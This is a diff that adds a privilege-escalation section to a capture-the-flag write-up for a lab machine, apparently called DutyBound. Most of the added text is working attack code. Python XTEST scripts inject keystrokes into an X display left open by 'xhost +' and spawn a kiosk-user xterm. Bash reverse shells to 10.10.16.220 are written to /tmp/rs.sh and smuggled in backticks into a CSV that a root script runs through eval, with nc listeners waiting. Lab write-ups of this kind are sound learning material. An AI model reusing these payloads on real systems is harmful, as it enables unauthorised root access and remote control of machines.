@@ -319,66 +319,367 @@ INSERT INTO bp_scan_audit (..., airline_use) VALUES (..., '...03123'); COPY (SEL
 
 ---
 
-## 
+## privesc
+
+
+```
+id
+env
+ls /home
+```
+
+<img width="1167" height="478" alt="image" src="https://github.com/user-attachments/assets/481c62f1-6010-4771-9937-c8b867102d03" />
+
+> enumeration of the users reveals another user with a shell and a home dir, `dutyfree-kiosk`. so that's probably the user we want to attack.
+
+> however we may have to go through `airsnacksdf` first, which is the user running the webapp, whose source code we can now read in `/opt/vrs/airsnacksdf`
+
+> there are also some other scripts int `/opt/vrs` which may be of interest
+
+<img width="762" height="96" alt="image" src="https://github.com/user-attachments/assets/e5dad342-8390-4ea6-a56d-48c35e7f8225" />
+
+
+---
+
+## the script `/opt/vrs/bin/apply-duty-rates.sh` has some content:
+
+
+```
+RATES="/opt/vrs/data/duty-rates.csv"
+# ...
+while IFS=, read -r tax_class duty_pct vat_pct; do
+    # ...
+    eval "${tax_class}=${duty_pct}"
+
+done < "$RATES"
+# ...
+```
+
+> and that csv file can be written by the group `pos-ops`, which dutyfree-kiosk is a member of. so once we get to that user, we will be able to inject commands.
+
+
+> the script runs as root when that csv file is modified. that is because there is a systemd service for it vrs-duty-apply.service and vrs-duty-apply.path
+
+---
+
+```
+cd /opt/vrs/data/
+cat duty-rates.csv
+```
+
+<img width="1010" height="304" alt="image" src="https://github.com/user-attachments/assets/cc3a6dd9-d65d-4fd5-bdfc-f054ba47ff68" />
+
+> eeping that in the back pocket for now...
+
+---
+
+```
+ps aux 
+```
+
+```
+dutyfre+    1722  ... /lib/systemd/systemd --user
+dutyfre+    1730  ... /bin/sh /usr/bin/xinit ...
+dutyfre+    1759  ... xinit /home/dutyfree-kiosk/...
+root        1760  ... /usr/lib/xorg/Xorg :0 ...
+dutyfre+    1771  ... /usr/bin/openbox ...
+dutyfre+    1774  ... /snap/firefox/firefox ...
+```
+
+---
+
+### 1. `Xorg` — the X server
+
+```text
+
+root        1760  0.0  1.9 522548 76940 tty7     Sl   19:16   0:02 /usr/lib/xorg/Xorg :0 ...
+```
+
+- **`:0`** — the display number is right there in the command line. **This is how you know it's `:0`** — you don't guess, you read it from `ps aux`.
+    
+- **`root`** — Xorg runs as root (normal; it drops privileges per-client, but the server itself needs root for device access).
+
+
+> "The X server is running on :0 (visible in the Xorg :0 command line), attached to tty7 — the standard graphical VT on Linux. This is the display I will target."
+
+
+> ### X Server as the "screen manager" for Linux graphical sessions. It is the program that actually draws windows on the monitor, receives your keyboard and mouse input, and tells applications "here is where you should draw."
+
+
+On DutyBound, the X Server is called `Xorg`, and it is running on **display `:0`**. we saw this in `ps aux`:
+
+```text
+
+root  1760  ... /usr/lib/xorg/Xorg :0 ...
+```
+
+The `:0` is the display number. The kiosk user (`dutyfree-kiosk`) is using this X Server to run Firefox and Openbox (the window manager).
+
+
+---
+
+### 2. `openbox` — the window manager
+
+```text
+
+dutyfre+    1771  ... /usr/bin/openbox ...
+```
+
+- **`dutyfre+`** — runs as kiosk.
+    
+- **`openbox`** — the WM that owns the keyboard shortcuts. **This is  tells us Ctrl+Alt+T will work.** Without Openbox, keyboard shortcuts do nothing; X just passes raw key events to the focused window.
+    
+
+**For the writeup:** "Openbox runs as `dutyfree-kiosk` and manages the kiosk session. Openbox's default `rc.xml` binds `Ctrl+Alt+T` to `xterm`. Because the WM belongs to the kiosk user, any terminal spawned by that binding runs as `dutyfree-kiosk`."
+
+
+---
+
+
+### 3. `firefox` — the foreground application
+
+```text
+
+dutyfre+    1774  ... /snap/firefox/firefox ...
+```
+
+- **`dutyfre+`** — runs as kiosk.
+    
+- **`firefox`** — the kiosk app, which almost certainly has **input focus** (it's the window the user is "looking at").
 
 
 
 
 
+    
+---
+
+
+
+| Fact                              | Evidence                                     | Consequence                                      |
+| --------------------------------- | -------------------------------------------- | ------------------------------------------------ |
+| X server on `:0`                  | `Xorg :0` in `ps`                            | Target `DISPLAY=:0`                              |
+| Session owned by `dutyfree-kiosk` | `xinit`, `openbox`, `firefox` all `dutyfre+` | Any process spawned by the session runs as kiosk |
+| Openbox is running                | `openbox` PID 1771                           | Ctrl+Alt+T binding is active                     |
+| Firefox has focus                 | It's the foreground app                      | Naive XTEST typing fails; need explicit focus    |
+| X runs as root                    | `Xorg` owner is `root`                       | If `xhost +` is set, any local user can connect  |
+
+
+
+
+## How We Got the Shell as dutyfree-kiosk
+
+
+
+1. **The X Server is open to anyone.** Because of `xhost +`, your `postgres` user can send commands to the kiosk's graphical session.
+    
+2. **We injected `Ctrl+Alt+T`.** We used a Python library called `XTEST` to send a fake keypress to the X Server. `XTEST` lets you simulate keyboard and mouse events as if a real person pressed them. We sent: "Press Control, press Alt, press T."[](http://pike.roxen.se/generated/manual/modref/ex/predef_3A_3A/Protocols/X/Extensions/XTEST/XTestFakeInput.html#XTestFakeInput)
+    
+3. **Openbox received the shortcut.** Openbox is the window manager running as `dutyfree-kiosk`. Your `/etc/xdg/openbox/rc.xml` file shows the binding:
+    
+  ```  xml
+    
+    <keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
+  ```
+  
+  So Openbox said: "Ctrl+Alt+T means run `xterm`." Because Openbox is running as `dutyfree-kiosk`, the `xterm` it spawned also ran as `dutyfree-kiosk`.
+    
+4. **The xterm opened, but Firefox had focus.** Here is the tricky part. `XTEST` sends keystrokes to the **currently focused window**. Firefox was in focus, so if we just typed, the text would go to Firefox, not our new xterm.
+    
+5. **We forced focus onto the xterm.** We found the xterm's window by its PID (`_NET_WM_PID`), and used `set_input_focus` to tell the X Server: "Give keyboard focus to this window". This is what `xdotool windowactivate` does, but `xdotool` was blocked on this box.[](https://deepwiki.com/python-xlib/python-xlib/4.6-input-grabs-and-focus#1)
+    
+6. **We typed the command.** Once the xterm had focus, we typed `/tmp/rs.sh` and pressed Enter. The xterm (running as `dutyfree-kiosk`) executed the script, and the script connected back to your Kali listener on port 4447.
 
 
 
 
 
+----
+
+## A — Verify X access
+
+```
+DISPLAY=:0 xdpyinfo | head -3
+```
+
+
+<img width="992" height="137" alt="image" src="https://github.com/user-attachments/assets/38c7df76-8bca-4e09-adb9-17d41178793b" />
+
+> we can reach `:0` without an auth cookie.
+> Normally, the X Server is **locked down**. It uses a "cookie" (a secret file called `.Xauthority`) to check: "Are you the user who owns this session? If not, go away." This is the MIT-MAGIC-COOKIE-1 mechanism.[](http://man.openbsd.com/Xsecurity.7)
+
+>But on DutyBound, someone ran **`xhost +`**. This command tells the X Server: "Disable all access checks. Let anyone connect." The manual page for `xhost` warns: _"This disables host access checking and thus allows everyone to connect. You should never do this on a network on which you don't trust all users."_
+
+>That is the vulnerability. When you ran `DISPLAY=:0 xdpyinfo`, you were saying: "Hey X Server at `:0`, can I talk to you?" And because `xhost +` was set, it answered: **"Yes, here is my info."** You didn't need the kiosk user's cookie.
+
+---
+
+## Spawn the kiosk xterm via Ctrl+Alt+T
+
+
+```
+DISPLAY=:0 python3 -c "
+from Xlib import X, XK, display
+from Xlib.ext import xtest
+import time
+d = display.Display()
+c = d.keysym_to_keycode(XK.string_to_keysym('Control_L'))
+a = d.keysym_to_keycode(XK.string_to_keysym('Alt_L'))
+t = d.keysym_to_keycode(XK.string_to_keysym('t'))
+for k in (c,a,t): xtest.fake_input(d, X.KeyPress, k)
+d.sync(); time.sleep(0.2)
+for k in (t,a,c): xtest.fake_input(d, X.KeyRelease, k)
+d.sync()
+"
+```
+
+
+**`then check`**
+
+```
+ps -eo pid,user,comm | grep -i xterm
+```
+
+<img width="806" height="92" alt="image" src="https://github.com/user-attachments/assets/b2274b5f-e5d5-4ed6-9c44-a659b305d37c" />
+
+
+----
+
+
+## Write `/tmp/rs.sh`
+
+```
+printf '%s\n' 'bash -i >& /dev/tcp/10.10.16.220/4447 0>&1' > /tmp/rs.sh
+chmod 777 /tmp/rs.sh
+```
+
+
+---
+
+## Deploy the focus-and-type script
+
+```
+cat > /tmp/ft.py << 'PYEOF'
+#!/usr/bin/env python3
+import sys, time
+from Xlib import X, XK, display
+from Xlib.ext import xtest
+
+pid = int(sys.argv[1]); text = sys.argv[2]
+d = display.Display(); root = d.screen().root
+
+def find(w):
+    try:
+        p = w.get_full_property(d.intern_atom('_NET_WM_PID'), X.AnyPropertyType)
+        if p and p.value[0] == pid: return w
+    except Exception: pass
+    try:
+        for c in w.query_tree().children:
+            r = find(c)
+            if r: return r
+    except Exception: pass
+    return None
+
+w = find(root)
+if not w:
+    print("window not found"); sys.exit(2)
+print("found window for pid", pid)
+w.configure(stack_mode=X.Above)
+w.set_input_focus(X.RevertToParent, X.CurrentTime)
+d.sync(); time.sleep(0.5)
+
+for ch in text:
+    ks = XK.string_to_keysym(ch) or ord(ch)
+    kc = d.keysym_to_keycode(ks)
+    if kc:
+        xtest.fake_input(d, X.KeyPress, kc)
+        xtest.fake_input(d, X.KeyRelease, kc)
+        d.sync(); time.sleep(0.04)
+
+r = d.keysym_to_keycode(XK.string_to_keysym('Return'))
+xtest.fake_input(d, X.KeyPress, r); xtest.fake_input(d, X.KeyRelease, r); d.sync()
+print("done")
+PYEOF
+chmod 777 /tmp/ft.py
+```
+
+
+---
+
+## Focus PID 3678 and type /tmp/rs.sh
+
+```
+DISPLAY=:0 python3 /tmp/ft.py 3678 /tmp/rs.sh
+```
+
+<img width="1045" height="90" alt="image" src="https://github.com/user-attachments/assets/aae19f25-deb8-4782-922f-a0ff79e53f2a" />
+
+<img width="1088" height="155" alt="image" src="https://github.com/user-attachments/assets/5ac1a71f-6162-4ecb-9a8c-6976ec8e3134" />
+
+---
+
+
+## privesc to root 
+
+> ### as we saw before, the path to root has to do with the custom csv ingestion script in /opt/vrs
+
+
+```
+ eval "${tax_class}=${duty_pct}"
+```
+
+> #### those variables come from the first two fields in the csv, which we already discovered we have write access to. and due to the systemd file-watcher service or whatever it's really called, any edits we make to that csv will automatically trigger this script as root.
+
+
+```
+ls -la /opt/vrs/data/duty-rates.csv
+```
+
+<img width="778" height="76" alt="image" src="https://github.com/user-attachments/assets/3c5f9da6-27f7-4e73-a009-dd7806715ff4" />
+
+> The key is 1001(pos-ops) in your groups and root pos-ops ownership. Group-writable = you can append.
+
+---
+
+
+## Confirm the trigger service
+
+```
+systemctl list-unit-files | grep -i vrs
+systemctl cat vrs-rates.service 2>/dev/null | grep -E 'Type|ExecStart|User'
+```
+
+<img width="1142" height="157" alt="image" src="https://github.com/user-attachments/assets/7ed25cc4-2e55-4194-9906-ea20d58b4f61" />
+
+## Append the payload and trigger
+
+
+```
+printf '%s\n' '`bash -i >& /dev/tcp/10.10.16.220/4446 0>&1`,45,20' >> /opt/vrs/data/duty-rates.csv
+touch /opt/vrs/data/duty-rates.csv
+tail -3 /opt/vrs/data/duty-rates.csv
+```
+
+```
+nc -lnvp 4446
+```
+
+
+<img width="983" height="217" alt="image" src="https://github.com/user-attachments/assets/43d9b17e-0d05-4310-8aad-79f524973d70" />
+
+
+## What  happened
 
 
 
+1. **A file is writable by our group.** `/opt/vrs/data/duty-rates.csv` is owned `root:pos-ops`, mode `775`. we are `dutyfree-kiosk`, in `pos-ops`. So we can append to it.
+    
+2. **A root service reads that file automatically.** A systemd `.path` unit watches the file; when it changes, it triggers a root-owned oneshot service that runs `/opt/vrs/bin/apply-duty-rates.sh`.
+    
+3. **That script uses `eval` on unvalidated input.** The first CSV field (`tax_class`) goes straight into `eval "${tax_class}=${duty_pct}"`. Backticks in `tax_class` are executed as a command.
+    
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+our job was to bridge (1) to (3): write a payload the script will `eval` as root.
 
 
 
